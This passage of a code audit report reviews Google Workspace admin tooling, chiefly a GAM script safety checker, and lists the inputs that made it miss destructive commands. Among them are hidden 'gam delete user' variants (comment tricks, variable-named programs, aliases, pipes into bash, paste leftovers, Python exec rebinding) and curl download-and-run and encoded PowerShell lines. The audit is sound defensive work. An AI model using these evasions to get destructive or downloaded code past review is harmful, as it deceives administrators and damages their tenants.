- Done (`53ed02a`): main block at the end; both commands run every test; README count fixed.
- CONFIRMED by the coordinator. `if __name__ == "__main__": unittest.main(verbosity=2)` sits at line 2934 of the 3486-line `test_tenant_scope.py`. The 15 test classes defined after it (`TestCsvDataRows`, `TestScanSelectionEmpty`, `TestBatchedRedirectCounting`, `TestCollectDnsStatus`, `TestCollectOrdering`, `TestLicenceWasteGating`, `TestAtRiskRecoveryFactor`, `TestAtRiskAdminRecovery`, `TestSharedDriveScanAsMember` with 10 tests, `TestTempGrantCleanup` with 3, `TestTempGrantFailure` with 2, `TestResumeUnscannedSharedDrives`, `TestTier3Batched`, `TestParseArgsGuards`, `TestPlainLogFile`) are never loaded when the file is run as `python3 test_tenant_scope.py`, which is the command the README gives: "Ran 259 tests". `python3 -m unittest test_tenant_scope` runs all 294 and they pass, so nothing is currently broken, but the skipped set includes every test of the temporary organizer grant and its removal (the audit's only write path) and of the Shared Drive scan. The other three test files in the repository have their main block on the last lines. Fix: move the main block to the end; fix the README count; consider a CI job (see CI-02).

### AUD-T02 `[x]` Tests to add, in priority order
- Done: every item has a test; the ones added in this section sit with their fix commits (AUD-08 to AUD-41), the rest came with AUD-01 to AUD-07.
- A check that raises when the previous run had findings from that check (AUD-02).
- Every "not in internal" check with `internal_domains == []` (AUD-01).
- A group-targeted policy fixture (AUD-04); a `security.password` fixture with no API row (AUD-21).
- An evidence-id uniqueness assertion over every finding a full fixture produces (AUD-07).
- Ctrl+C mid-module after a cleanup failure (AUD-05); what a refused run directory contains afterwards (AUD-08); `--render-only` with a mismatching tenant (AUD-09).
- `load_tenants` with int, string and list type errors (AUD-11); `--compare-with` a missing directory (AUD-34); `parse_args` guards for `--tenant` with `--all` and `--all` with `--run-dir` (the guards exist at 6707-6712 but are untested).
- tamingdns error shapes (AUD-14); `check serviceaccount` with no PASS/FAIL lines (AUD-15); BOM input (AUD-16); a collector that raises (AUD-17).
- A Business Standard tenant for licence waste asserting neither flagged nor clean (AUD-03); a suspended-organizer drive (AUD-06); a space-joined `API_SCOPES` fixture (AUD-24); `check_public_files` over `shareddrive_external`.

## B5. Improvements (not defects)

- `delivery_gate` (6522-6526) only inspects modules present in the manifest, so `--skip-tier 3` or `--skip shareddrive_external` gives "Ready to send" with no Drive scan at all, while the same module failing would hold it. Hold, or name the omission in the QA verdict. `test_delivery_gate_and_exit_codes` codifies the present behaviour.
- `exit_code` (6545-6548) treats a missing `complete` as True while `delivery_gate` treats it as False; pick one.
- `--compare-with` may name another customer's run (`test_compare_with_flag_wins` asserts this); say so in the report or refuse unless customer IDs match.
- `check_admin_roles`: roles assigned to a group are shown but their members are not counted for sprawl or checked for suspended holders; join `group_members.csv`.
- `check_public_calendars` (3470) only looks at `scope.type == "default"`; a primary calendar shared to a named external user or domain is ignored although `calendaracls.csv` carries `scope.value`.
- `check_group_exposure` does not read `whoCanViewMembership == ANYONE_CAN_VIEW`.
- `sd-open-settings` (HIGH) fires on every drive left at Google's default `domainUsersOnly=False` even when the OU-level Drive sharing policy already blocks external sharing; cross-check with `check_sharing_policy` to cut noise on internal-only tenants.
- `check_mailbox_delegation` marks a break-glass delegate "dormant"; reuse `_break_glass`.
- `check_risky_oauth` splits scopes on whitespace only; a non-default `csv_output_field_delimiter` in gam.cfg would silently match nothing.
- Refuse a `--run-dir` that holds no `manifest.json` unless it is empty; today `--run-dir .` turns any folder into a run directory and `earlier_runs` then scans its parent.
- The Shared Drive scan holds each drive's full listing and ACL rows in memory (`listed()` returns `out` as one string); a redirect file per step would bound memory on very large drives.
- When a drive's only active members are groups, expand them through `group_members.csv` before declaring UNSCANNED.
- Add `adminaccess` explicitly to the top-level `print shareddriveacls` so the intent survives a GAM default change.
- Comment the Merge-versus-Max semantics in `_parse_policy_settings`; in `check_2sv_methods` say "2SV is not enforced at all" before the device-trust details.

## B6. Verified OK

- GAM7 syntax of every `MODULES` entry and the column names each check reads via `col()` (users fields and `Licenses`/`LicensesDisplay`, admins/adminroles, groups and group-members fields, shareddrives/shareddriveacls `oneitemperrow`, shareddriveorganizers, mobile/cros, inbound SSO, datatransfers, userinvitations, vault objects, Classroom prints, `report customers/users`, `print policies formatjson` (`name,JSON`), tokens, `report admin|login|drive start -30d`, alerts filter, the tier-2 per-user prints, `forwardEnabled,forwardTo`, `delegateAddress`, `sendAsEmail/isPrimary/verificationStatus`, `forwardingEmail`, filter columns, `permission.*`, `scope.type`, `verificationCodesCount`, `accounts:*`). `col()` is case-insensitive. GAM7 expands `suspended` to include `suspensionReason`.
- `external_pm_args`, the `csvfile <path>:primaryEmail` rewrite with absolute `redirect csv ... multiprocess`, `config auto_batch_min/num_threads`, and the backupcodes variant that strips the redirect and pins `auto_batch_min 0`.
- `run_gam`: stdout to a temp file (no pipe fill, partial rows survive a kill), stderr read live on a daemon thread, `proc.wait()` after the kill, `_kill_tree` using `killpg` on POSIX and `taskkill /T` on Windows, `CREATE_NEW_PROCESS_GROUP`, every network and subprocess call bounded by a timeout, `FileNotFoundError` turned into an rc.
- Signal handling: the first Ctrl+C only sets a flag; `collect_sd_external` checks it between drives, so a grant made in the current drive is always removed by the `finally` (except AUD-05's record of a failed removal).
- `run_checks` isolates each check, records `check_errors`, surfaces an INFO finding, and does not swallow `KeyboardInterrupt`/`SystemExit`; only the four severities in `SEVERITY_ORDER` are ever constructed.
- `posture_score` formula and floor; `earlier_runs`/`find_previous_run`/`score_trend` (same customer, `complete` required, current dir excluded, trend capped at six); `compare_with_previous` rules apart from AUD-02 and AUD-07.
- HTML escaping of every tenant-derived value in both reports; DNS re-check href quoted; no `<script>`, `onclick` or `javascript:`; evidence tables capped at 10 rows with a note and `findings_evidence.csv` uncapped; `findings.csv` carries `change` and `modules`.
- `delivery_gate` and `exit_code` agree with the README and the v1.7.2 commit for incomplete run, critical module error/partial/skipped, check errors, stale temporary grant, `n/a` modules, 130 on interruption (apart from AUD-12); `EXIT_PRIORITY` and the `--all` worst-code reduction are tested.
- `parse_args` exclusions (`--render-only` needs `--run-dir`, `--grant-temp-access` needs `--admin`, `--tenant`/`--all` exclusive, `--all` rejects `--run-dir`/`--compare-with`); every flag in the README table exists and the reverse.
- `run_tenant`/`main`: per-tenant run directories, `setup_logging(force=True)` resets handlers, `GAMCFGDIR` restored in `finally`, one tenant's exception caught and counted, `--list` and `--render-only` skip the update check, `--dry-run` returns before `complete`.
- Policy engine: `sortOrder` resolution and per-OU separation, `rule.*` de-duplication, defaults only at root and only for missing fields, Education marketplace default, GMAIL 5.5/7.6 consequences, DRIVE/GROUPS/CALENDAR/CHAT/COMMONCONTROLS rule values versus the rego (apart from AUD-33), `_duration_seconds`, 30-day windows delegated to GAM, drive sharing log parsing, `_norm_sku` on distinct-SKU cases, `EDITION_FEATURES` SKU ids.
- Date handling: `Never`, empty and the 1970 epoch stamp are all "never"; `fromisoformat` is always fed `.replace("Z", "+00:00")` so it works on 3.9; naive stamps get UTC; "now" is `datetime.now(timezone.utc)` everywhere.
- Network disclosure matches the README: `www.googleapis.com` (HEAD), `tamingdns.com` (JSON-RPC carrying only the domain name and the DKIM selector), `dns.google`, `raw.githubusercontent.com` (VERSION); TLS verified; offline, gate 2 aborts cleanly.
- Python 3.9: `ast.parse(feature_version=(3,9))` passes; `str.removeprefix`, `shutdown(cancel_futures=True)`, `basicConfig(force=True)` and `isoformat(timespec=)` are all 3.9; Windows console and `taskkill` handled; thread safety of manifest writes (only the main thread writes; `stderr_log` is locked).

---

# C. GAM Script Checker (`gam-script-checker/`)

Files: `gamcheck.py` (2148 lines, v0.4.6), `verbs/*.json`, `developers/` (tests, table builder, blind set, corpus tools), `.github/workflows/gam-script-checker-release.yml`, `README.md`.

The reviewer read every line, ran about 120 adversarial scripts and a 330-row command truth table, and rebuilt `verbs/gam7.json` from the GAM 7.48.20 source (byte-for-byte identical). The coordinator independently re-ran every under-warning below against the shipped checker and got the same verdicts. The verb tables, the doit/preview truth table, the recognised invocation forms and the crash resistance in file mode are all sound (see C5). The problems are in the layers in front of the tables: comment handling, continuation handling, variables and aliases that name gam, text piped into shells, and paste mode.

Severity convention for this tool: an under-warning (READ-ONLY or CHANGES printed for a script that changes or deletes) is Critical or High, because the user's next action after a green verdict is to run the script.

## C1. Critical

### CHK-01 `[x]` Paste mode leaves the rest of a multi-line paste in the terminal, and the shell runs it after gamcheck exits
- Done (`73439ef`): lines arriving within 1 s of the blank line and a last line without Enter are checked, the rest is flushed; a paste pausing over 1 s still reaches the shell.
- Severity Critical. CONFIRMED on a Linux pty by the reviewer; PLAUSIBLE and most likely on Windows (no readline, the console delivers lines one at a time and cmd.exe reads the leftovers; the README's Windows instructions tell the user to "paste anyway" when Windows warns about several lines).
- Where: `read_paste` 2047-2084; the loop at 2074-2082 stops at the first blank line after some input.
- What happens: a paste containing a blank line is cut at the blank line (documented), but the unread lines stay in the tty input buffer and the shell reads them when gamcheck returns. Reproduction (pty running `bash --norc -i`, then `python3 gamcheck.py`, then one paste of `gam print users` / blank / `echo PASTED-TAIL-RAN; gam delete user bob@example.com` / blank): gamcheck prints `VERDICT: READ-ONLY`, then the shell prompt shows `echo PASTED-TAIL-RAN; gam delete user bob@example.com` and runs it. On an admin workstation `gam` exists and the delete runs under a green verdict. gamcheck does not enable bracketed paste (no `ESC[?2004h` in its output); with GNU readline 8.1+ the whole block arrives as one `input()` string, so behaviour differs by platform, and `ttypaste.py` simulates typing rather than a terminal paste so it cannot see this.
- Fix: after the terminating blank line, drain pending input (POSIX: `select` or `termios.tcflush(fd, TCIFLUSH)`; Windows: `msvcrt.kbhit()`/`getwch()` loop or `FlushConsoleInputBuffer`), and either check the drained lines too or print a loud "N more pasted lines were discarded" warning; consider reading until a short idle timeout instead of a blank line when stdin is a tty. Document the behaviour until fixed.

### CHK-02 `[x]` A `#` inside a word truncates the rest of the line
- Done (`df9a835`): comments found by the checker, not shlex.
- Severity Critical. CONFIRMED (coordinator reproduced).
- Where: `_tokenise` 1014 `lex.commenters = '' if lang == 'batch' else '#'`.
- What happens: shlex in posix mode starts a comment at any unquoted `#`, even mid-word; bash only at the start of a word. `$#`, `${#VAR}`, `${#ARR[@]}` and `word#` all cut the line. Each of these prints READ-ONLY with a `gam info domain` above it:
  ```
  [ $# -gt 0 ] && gam delete user "$1"
  if [ $# -eq 1 ]; then gam delete user "$1"; fi
  n=${#USER}; gam delete user bob@example.com
  N=$#; gam delete user bob@example.com
  gam print users#; gam delete user bob@example.com
  ```
  The mode reader is also affected: `while [ $# -gt 0 ]; do MODE=$1; shift; done` tokenises to `['while', '[', '$']`, so a runbook invoked as `bash runbook.sh check go` prints READ-ONLY with "mode read from the arguments: MODE='check'" while bash ends with MODE=go and runs the delete.
- Fix: `lex.commenters = ''` for every language and strip comments yourself (a `#` at line start or after whitespace, outside quotes). GAM's own `doBatch` uses `shlex.split(line)` with comments off, so this also matches how GAM reads batch files.

## C2. High (under-warnings)

### CHK-03 `[x]` A command whose program is a variable the checker does not know is silently ignored, not CANNOT TELL
- Done (`4098cc2`): unresolved program variable reads CANNOT TELL.
- CONFIRMED (coordinator reproduced the first form). `_gam_position` 1453-1475 returns None and `_gam_hidden` 1401-1414 returns False, so the segment produces no finding. README: "Commands put together while the script runs ... come out as CANNOT TELL, never as READ-ONLY". All print READ-ONLY with a read-only gam line above:
  ```
  BIN="$(which gam)"; $BIN delete user bob@example.com            (shell)
  TOOL=/opt/tools/t; "$TOOL" delete user bob@example.com          (shell)
  printf -v CMD "gam delete user %s" bob@example.com; $CMD        (shell)
  $t = Get-Command gam; & $t delete user bob@example.com          (PowerShell)
  $exe = Join-Path $PSScriptRoot "gam.exe"; & $exe delete user .. (PowerShell)
  set BIN=%~dp0gam.exe  then  %BIN% delete user bob@example.com   (batch)
  ```
  The blind set's E11/F3 pass only because the variable happens to be called `GAM`/`$gam` (`_gam_name` 968 tests `'gam' in name`).
- Fix: when a segment's first non-assignment token is a variable (or `& $var`) that is not a known gam variable, emit CANNOT TELL "runs a program named by a variable"; treat assignments whose value contains `command -v gam`, `which gam`, `Get-Command gam`, `Join-Path ... gam.exe` or `%~dp0gam.exe` as gam variables.

### CHK-04 `[x]` `%~dp0gam.exe` in a batch file is not recognised as gam
- Done (`4098cc2`): %~dp0gam.exe read as gam.
- CONFIRMED (coordinator reproduced). `_gam_name` 958-972 splits on `[\\/]` and is left with `%~dp0gam.exe`; after `.exe` is stripped, `%~dp0gam` is not in `GAM_NAMES`. `%~dp0\gam.exe` works. `%~dp0gam.exe delete user bob@example.com` prints READ-ONLY. This is the standard "gam next to this script" idiom in `.bat` files.

### CHK-05 `[x]` Text piped into a shell is not reported
- Done (`453b6dd`): piped text reads CANNOT TELL.
- CONFIRMED (coordinator reproduced). 1339-1349: an echo/printf segment is exempt from `_gam_hidden`, and the `| bash` segment has no script argument so `_script_path` (1436-1437) returns None. `printf "gam delete user bob@example.com\n" | bash` under `gam info domain` prints READ-ONLY. The existing floor case `echo gam delete user x@example.com | sh` (`test_gamcheck.py:183`) passes only because the fixture has no other gam line, so the "no gam commands found" fallback yields CANNOT TELL; add one read-only line and it is READ-ONLY. README says `bash -c "gam ..."` is CANNOT TELL.
- Fix: when a pipeline ends in a shell runner (`sh|bash|zsh|pwsh|powershell|cmd`, also `xargs ... sh -c`) with no script file, report CANNOT TELL.

### CHK-06 `[x]` A comment ending in `\` (bash) or a backtick (PowerShell) swallows the next line
- Done (`df9a835`): a comment never continues.
- CONFIRMED (coordinator reproduced). `_logical_lines` 984-1001, line 994 joins any line ending in the continuation character; comments do not continue in bash or PowerShell. `# remove the leaver, see ticket \` followed by `gam delete user bob@example.com` prints READ-ONLY; so does a Windows path at the end of a comment (`# output goes to C:\GAM\`) and a PowerShell comment ending in a backtick. Batch `rem ... ^` really does continue in cmd.exe, so batch is right as it stands.
- Fix: never join when the physical line's first non-blank character is `#` (shell, PowerShell, gambatch).

### CHK-07 `[x]` GAM batch files have no line continuation, but the checker joins them
- Done (`df9a835`): batch files read one command per line.
- CONFIRMED against the GAM 7.48.20 source (`doBatch` reads one command per physical line with `shlex.split(line)`); coordinator reproduced. `_logical_lines` 988 gives `gambatch` a `\` continuation, so a `.txt` with `gam print users \` followed by `gam delete user bob@example.com` prints READ-ONLY while GAM runs both lines.
- Fix: no continuation character for `gambatch`.

### CHK-08 `[x]` Wrapper-function detection stops at the first `}` and ignores subshell bodies
- Done (`85f7182`): wrappers found by brace matching.
- CONFIRMED (coordinator reproduced). 1499: the regex body `[^}]*` ends at the `}` of `${1}` or `${GAM:-gam}`, so the function is not registered, while its `gam "$@"` line is still skipped at 1356 as "the body of a wrapper function". Call sites are then never checked:
  ```
  g() {
    "${GAM:-gam}" "$@"
  }
  g delete user bob@example.com        -> READ-ONLY
  g() ( gam "$@" ); g delete user ...  -> READ-ONLY
  ```
- Fix: match braces with nesting, accept `( ... )` bodies, and never skip a `gam "$@"` line whose enclosing function was not registered.

### CHK-09 `[x]` Alias chains and aliases with arguments are lost
- Done (`85f7182`): alias chains resolved.
- CONFIRMED (coordinator reproduced). 1492-1494 resolves one level with empty wrapper sets and drops the alias's own words after the first. `alias g7="gam"; alias zap="g7 delete"; g7 info domain; zap user bob@example.com` prints READ-ONLY; `alias zap="gam delete"; zap user bob@example.com` gives CANNOT TELL "incomplete gam command".
- Fix: resolve aliases iteratively and keep the alias's trailing words as a prefix to the call's arguments.

### CHK-10 `[x]` Mode-word logic ignores where the assignment sits
- Done (`fb95c3f`): mode assignment position respected; xargs/parallel judged whole.
- CONFIRMED (coordinator reproduced through a `bash x.sh check` runner line). `_mode_scope` 1028-1230 resolves `MODE=$1` wherever it appears, then evaluates every test with that value. A script that tests `$MODE` first and assigns `MODE=$1` afterwards prints READ-ONLY with "mode read from the arguments: MODE='check'", while bash tests an empty MODE and runs the delete. `test_modes` covers function ordering but not top-level ordering. Related (Medium): `xargs bash rb.sh < modes.txt` applies the `${1:-check}` default and prints READ-ONLY because `follow_script` (946) takes argv from the segment only.
- Fix: an assignment that appears after any test of the same name sets `modes[name] = None`.

### CHK-11 `[x]` Python: exec entry points rebound through assignment, `partial`, `getattr`, star import or `os.exec*` are missed
- Done (`756eeba, 4fe2559, 5388a54`): rebinding, partial, getattr, star import, os.exec*, scopes and chains followed.
- CONFIRMED (coordinator reproduced the first form). `_name` 1646-1652 resolves import aliases only; `EXEC_CALLS` 1555-1558 has `execv`/`execvp` but not `execl`/`execlp`/`execle`/`spawnl*`/`posix_spawn`; `_argument_lists` ignores lists whose first element is `gam`. Each with a read-only call above prints READ-ONLY:
  ```
  run = subprocess.run; run(["gam", "delete", "user", "bob@example.com"])
  run = functools.partial(subprocess.run, check=True); run(["gam","delete",...])
  getattr(subprocess, "run")(["gam", "delete", "user", "bob@example.com"])
  os.execlp("gam", "gam", "delete", "user", "bob@example.com")
  from subprocess import *  then  run(["gam", "delete", ...])   -> "no gam commands found"
  ```
- Fix: resolve a Name to an assigned Attribute through `self.scopes`; add the `os.exec*`/`os.spawn*`/`os.posix_spawn*` family; in `_argument_lists` also accept lists whose first element names gam.

## C3. Medium

### CHK-12 `[x]` `sh -c "$(curl ...)"` and `bash <(curl ...)` are not SUSPICIOUS
- Done (`453b6dd`): download-and-run reads SUSPICIOUS.
- CONFIRMED. The regex at 291 needs a pipe. `sh -c "$(curl -fsSL https://example.com/install.sh)"` is READ-ONLY (with `gam info domain`); `bash <(curl -s https://example.com/x.sh)` is CANNOT TELL worded "runs https://example.com/x.sh, which was not provided" because the URL is taken as a script path. README: "runs hidden or downloaded code" is SUSPICIOUS.

### CHK-13 `[x]` `powershell -ec <base64>` and `-encoded` are not flagged
- Done (`453b6dd`): -ec and every -EncodedCommand prefix read SUSPICIOUS.
- CONFIRMED. 293 `-e(?:nc|ncodedcommand)?\s+` misses `-ec`, `-encoded`, `-ea`; the base64 is then taken as a script name by `_script_path` (1436) and the line reads "runs SQBFAFgA..., which was not provided". Fix the regex and make `_script_path` return None when a `-e*` switch follows `powershell`/`pwsh`.

### CHK-14 `[x]` Quadratic time on a long token (a hang, not a crash)
- Done (`6e7ddba`): long plain runs bypass shlex; 5 MB in under 2 s.
- CONFIRMED (measured). `_tokenise` 1005-1020: shlex builds `self.token += nextchar`; 80k characters take 0.13 s, 160k take 0.47 s (x3.6 per doubling), a 1 MB line about 20 s, a 5 MB line did not finish in 120 s. A long `users a,b,c,...` list or a base64 blob stalls a pre-commit hook or the release gate. Fix: cap token length (treat tokens over about 64 KB as opaque `Dyn`) or pre-split on whitespace outside quotes.

### CHK-15 `[x]` Paste mode has no exception guard; a checker exception exits 1, the CHANGES code
- Done (`6e7ddba`): paste mode guarded like file mode; count_rows catches csv.Error/OSError.
- CONFIRMED on 3.11 and 3.13. 2109-2120 calls `checker.check_text(...)` without the `except Exception` that file mode has at 2132. A `data2.csv` in the current folder with a 200 000-character field plus a pasted `gam csv data2.csv gam delete user ~email` gives a `_csv.Error: field larger than field limit` traceback and exit 1; the same file in file mode gives "gamcheck could not read this script" CANNOT TELL, exit 2. The same path fires for a `PermissionError` on any followed batch file, script or CSV (`follow_batch` 911, `follow_script` 927, `count_rows` 384). Fix: the same try/except in the paste branch; in `count_rows` catch `csv.Error`/`OSError` (or raise `csv.field_size_limit`).

### CHK-16 `[x]` An embedded Python heredoc with a list-form subprocess call is invisible
- Done (`6e7ddba, 45fe4e7`): python stdin heredoc read as Python beside the shell reading.
- CONFIRMED. For `python3 - <<'EOF'` the `-` is filtered as an option so nothing is reported, and the heredoc body is read as shell, where `subprocess.run(["gam", "delete", "user", "bob@example.com"])` tokenises to a bracketed list with no `gam` run. Prints READ-ONLY with `gam info domain` above (the `os.system("gam ...")` string form does give CANNOT TELL). Fix: `python* -`/`bash -s` with a heredoc gives CANNOT TELL, or hand the heredoc body to the Python reader.

## C4. Low

- [x] **CHK-17** `test_adversarial`'s floor case `echo gam delete user x@example.com | sh` (`test_gamcheck.py:183`) passes for the wrong reason (CHK-05); add a read-only line to it and it fails.
- [x] **CHK-18** `blind_run.py:61` exits 1 only on under-warnings and crashes; a case expecting CANNOT TELL that comes back READ-ONLY is classed "over/other" (48-49), so a regression on `gam batch commands.txt` or `gam batch -` would not fail the release gate. Done (`6e7ddba`): expected CANNOT TELL coming back milder now fails the gate (positive control run).
- [x] **CHK-19** `developers/local-samples/` is not in `.gitignore` although the README says it is "never shipped"; `git archive` ships tracked files only, so it takes a `git add -A` to leak, but the test suite creates the folder. Done (`6e7ddba`): in .gitignore.
- [x] **CHK-20** `gamx` is accepted by `fetch_group_corpus.py`'s regex but not in `GAM_NAMES` (258): a script using only `gamx` reads "no gam commands found". Done (`45fe4e7`): gamx in GAM_NAMES.
- **CHK-21** Over-warnings worth trimming: `gam print users query "todrive"` is CHANGES (834 checks `words`, not `flags`); `gam sync device json x assigntype user preview` and `gam update group x delete member all users preview` are DESTRUCTIVE because `user`/`users` are value keywords that swallow `preview` in `_flags` (871); `gam user x sync groups addonly` is DESTRUCTIVE (first word skipped as the target); `Start-Process -FilePath gam -ArgumentList "..."` is worded "not a command GAM7 recognises ('-ArgumentList')" instead of the README's "handed to another program". Partly done (`45fe4e7`): todrive as a query value. Open: the user/users preview and sync groups addonly trims lower verdicts and need GAM 7.48.20 source to confirm; the Start-Process wording.
- **CHK-22** Wording: `gam user x delete messages id 1` is described as "dry run, would have: deletes Gmail messages"; GAM 7.48.20 accepts only `ids`, so GAM stops with an error and "dry run" is misleading. Same for `transfer ownership 1abc preview` (preview read as the user). Open: wording only, needs GAM 7.48.20 source to confirm.
- [x] **CHK-23** `asyncio.create_subprocess_exec("gam", "delete", ...)` and positional `subprocess.Popen("gam", ...)` give "gam with no arguments visible" (`_exec_argv` 1753 reads `args[0]` only). CANNOT TELL, so safe, but easily DESTRUCTIVE.
- [x] **CHK-24** A directory passed as the script prints "file not found" (exit 2 is right). README table lists `.txt`; `.gam` is also read (1283). Done (`45fe4e7`): a folder says so; the README .gam note is in the docs sweep.

### CHK-T01 `[ ]` Fixtures and tests to add
- Partly done: every listed case and every later fix is an inline test in `test_gamcheck.py` (`AUDIT_2026_11`, `test_paste`, `test_crash_is_cannot_tell`, timing checks). Open: separate files under `developers/fixtures/`; writing them was blocked by the osh-client-guard hook (file text with lines starting `gam`), so it waits for Paul.
- `$#` on a line with a command; a comment ending in `\`; a `.txt` batch file with a trailing `\`; `%~dp0gam.exe`; `run = subprocess.run`; `sh -c "$(curl ...)"`; assignment-after-test mode script; a variable-named program; `printf ... | bash` alongside a read-only line; a paste-mode crash regression like `test_crash_is_cannot_tell`; a long-token time bound.

## C5. Verified OK

- Tables: `build_verb_table.py` run against `src/gam/__init__.py`, `gamlib/glclargs.py` and `gamlib/glcfg.py` from GAM tag v7.48.20 reproduces `verbs/gam7.json` byte for byte. Table loading, alias resolution, the older-version fallback pairs and the `VERB_LEVEL` coverage gate behave as described. The CANNOT TELL rows in the reviewer's truth table are genuinely absent from GAM7's dispatch tables.
- Gates against GAM source: issuecommand doit gate matches `CROS_DOIT_REQUIRED_COMMANDS`; CrOS, device, device-user and mobile action spellings; Gmail delete/trash/spam/modify/forward/archive gates and the `ids` bypass; filerevisions; group add/delete/update/sync/clear `preview`/`actioncsv`; licence `preview`; transfer drive/ownership, claim ownership, collect orphans preview; named mobile versus query; purge events; `gam select x` alone saves gam.cfg (CHANGES is right); `update org ... sync` moves users. All 330 truth-table rows for recognised commands match or over-warn; none under-warns.
- Invocation forms followed correctly: `$G`, a gam path assigned later, `"$(dirname "$0")/gam"`, `~/bin/gam7/gam`, `../gam`, quoted and escaped names, `command|env|env -i|nohup|timeout|sudo -u|exec|time|caffeinate|ssh host gam`, `GAMCFGDIR=x gam`, `xargs -I{} gam`, subshells, braces, `&&`/`||`/`;`, `bash <<EOF`, `gam batch - <<EOF`, continuation characters, `source`/`.`/`./x.sh` followed into the file, unknown paths as CANNOT TELL, case fallthrough, array commands; `bash -c`, `su -c`, `find -exec`, `parallel`, `trap`, `python -c`, `xargs bash -c` as CANNOT TELL. PowerShell `& $gam`, `& $env:GAMBIN`, scriptblocks, `Start-Job`, `Invoke-Command`, `ForEach-Object`, `cmd /c gam`, `Invoke-Expression` as SUSPICIOUS. Batch `call`, `start "" /wait "%GAM%"`, `for /f ... do gam`, `^`, `"%GAM%"`, `set "GAM=..."`, comments ignored. Python import aliases, tuples, `pathlib`, class and list wrappers, `def gam(*args)`, `.format`/`%`/concat strings, dict of commands, `exec("...")` parsed, `eval` SUSPICIOUS, `shell=True` strings, `args=` keyword, `sys.argv` as CANNOT TELL.
- Mode logic: 27 ordering and syntax variants beyond the suite; only CHK-10 and CHK-02 break it. argv handling for `--`, `-x`, quoted modes, redirects, `$(cat m)`, `nohup ... &`, `||` is right.
- Crash resistance in file mode: binary, empty, BOM plus CRLF, UTF-16 with and without BOM, Python syntax error, NUL bytes, 100 000-deep nesting, batch recursion loop (depth cap 3), unbalanced quotes, unclosed blocks, 30 truncated command forms, missing file, directory, `--json` with a missing file: all report without a traceback with the documented exit codes. Pipe paste handles CRLF, UTF-16 BOM, Latin-1, prompt prefixes and curly quotes; Ctrl-D at start gives "nothing was pasted", exit 2.
- Portability: all eight Python files parse at `feature_version=(3, 9)`; tests and the blind runner pass on 3.11 and 3.13; the cp1252 console path works as the README describes.
- Release workflow: tag equals `__version__`, tests and blind runner run, the zip ships only tracked files, SHA256 notes appended once; version 0.4.6 consistent.
- README claims checked true: the four-line "Try it first" paste, the `offboard.sh` fixture verdict, worst-verdict exit code across files, `--quiet`, `gam csv`/`loop`/`batch`/`tbatch` followed, the tenant NOTE condition.


---

# D. GAM7 Update (`gam7-update/gam-update.sh`, `test-gam-update.sh`)

Verified against the official installer fetched during the audit: `gam-install.sh` line 39 sets `target_folder="$target_dir/gam7"` whenever `-d` is given; getopts is `"hd:a:o:b:lp:u:r:v:s"`, so `-l` and `-p false` are valid. `gam version checkrc` sets exit code 1 only when a newer release exists (`setSysExitRC(1 if latest_version > current_version else 0)` in `doGAMCheckForUpdates`), and prints `Current:`/`Latest:` through `printKeyValueList`, so the script's parsing and its trust in exit codes 0 and 1 are sound.

### UPD-01 `[ ]` `-d` only works when the directory is named `gam7`
- Severity Medium. CONFIRMED against the installer.
- Where: line 106 `bash "$installer" -l -p false -d "$(dirname "$GAMDIR")"`.
- What happens: the installer always installs into `<target_dir>/gam7`. `-d /opt/gam7` works; `-d /opt/gam` (or any other basename) installs a fresh copy into `/opt/gam7`, after which lines 115-120 read the old binary at `/opt/gam`, print "WARNING: still not on the latest version after upgrading" and exit 1, leaving a second GAM install in a sibling folder. The README says "If you installed somewhere else, pass the same directory here with -d" without the constraint.
- Fix: refuse (or warn and explain) when `basename "$GAMDIR"` is not `gam7`, or pass `-d "$GAMDIR" -s` (the installer's strip option installs directly into the target). Document it. Add a test case to `test-gam-update.sh`.

### UPD-02 `[ ]` The rollback copy is taken before the installer download, so one transient failure poisons every later cron run
- Severity Medium. CONFIRMED by ordering (lines 87-100).
- What happens: `cp -a "$GAMDIR" "$backup"` runs, then `curl` fetches the installer. If curl fails (GitHub blip, proxy, DNS) `set -e` exits 1, leaving `<dir>.bak-<version>`; every later run then fails at "ERROR: <backup> already exists, move it first" until a human removes it. The temp installer file is also left behind because the `rm -f` at line 110 is never reached (no `trap`).
- Fix: download (with `--retry 3 --max-time 120`) before copying; `trap 'rm -f "$installer"' EXIT`; consider removing the backup if the installer was never started.

### UPD-03 `[ ]` A successful upgrade can exit non-zero because of the final `gam info domain`
- Severity Low. CONFIRMED by `set -e` plus `pipefail`.
- Where: line 129 `"$GAMDIR/gam" info domain 2>&1 | head -3` after the upgrade has been verified; also line 118 `gam version | head -1` (SIGPIPE 141 is possible under `pipefail` if gam writes after `head` exits).
- What happens: in cron, an `info domain` that fails (expired token, API error) makes the script exit non-zero after a good upgrade, so the log reads as a failed upgrade. Fix: `|| true`, or capture the output and print it.

### UPD-04 `[ ]` Small robustness items
- No numeric cross-check of `Current` against `Latest`: GAM compares the two as strings (fine while components stay two-digit zero-padded); the script already parses both and could compare numerically. Low.
- `-d ""` or `-d /` degenerate; an empty `$current` would produce a backup named `<dir>.bak-`. Guard with `[[ -n $current ]]`. Low.
- No lock file; two overlapping cron runs would both copy and both run the installer. Low.
- The awk filter that hides the installer's `removed ...` lines depends on English GNU rm messages and on `$GAMDIR` matching the spelling the installer prints (a relative `-d` will not be hidden). Cosmetic.
- `test-gam-update.sh` covers only the pre-upgrade decision (by design); add a case for a `-d` whose basename is not `gam7` once UPD-01 is fixed.

Verified OK: unknown exit codes and a missing `Latest:` line are both errors (the trap the header describes); dry run exits before any change; `cp -a` works on BSD and GNU; `-p false` leaves rc files alone; the four stub scenarios in the test reproduce GAM's real output and pass.

---

# E. GYB Gmail Backup Tools (`gyb-gmail-backup-tools/`)

GYB's schema assumptions were checked: `settings(name,value)` with `db_version` 6, `messages(message_num, message_filename, message_internaldate)`, `labels`, and `<destination>-restored.sqlite` with `restored_messages` match GYB.

### GYB-01 `[ ]` A backup path containing `#`, `?` or `%` makes the doctor report a healthy backup as a PROBLEM
- Severity Medium. CONFIRMED (reproduced: exit 1 with "msg-db.sqlite is unreadable or has no settings table").
- Where: `gyb_backup_doctor.py:36` `sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)`.
- Why: in a SQLite URI `?` starts the query, `#` the fragment and `%` an escape, so the path is truncated or decoded wrongly. Backups are often under folders people name by hand.
- Fix: `db_path.resolve().as_uri() + "?mode=ro"` (handles spaces, Windows drives and special characters) or `urllib.parse.quote`.

### GYB-02 `[ ]` Count-based reconciliation can be fooled by a stray `.eml`
- Severity Medium. CONFIRMED (reproduced: two DB rows, `b.eml` missing, `stray-copy.eml` present, verdict "Backup verified: every message in the DB is on disk", exit 0).
